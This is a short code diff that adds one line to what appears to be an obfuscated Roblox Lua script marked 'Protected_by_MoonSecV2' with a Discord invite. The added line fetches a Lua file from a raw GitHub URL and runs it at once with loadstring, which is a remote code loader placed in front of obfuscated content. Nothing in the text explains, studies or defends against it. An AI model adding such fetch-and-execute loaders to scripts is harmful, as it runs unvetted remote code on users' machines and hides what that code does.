@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/KryptonMiner/Prankbros/main/ID_blacklist.lua'))()
 wait(1)
 _BGeBeEH2zMeQ7OyK, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
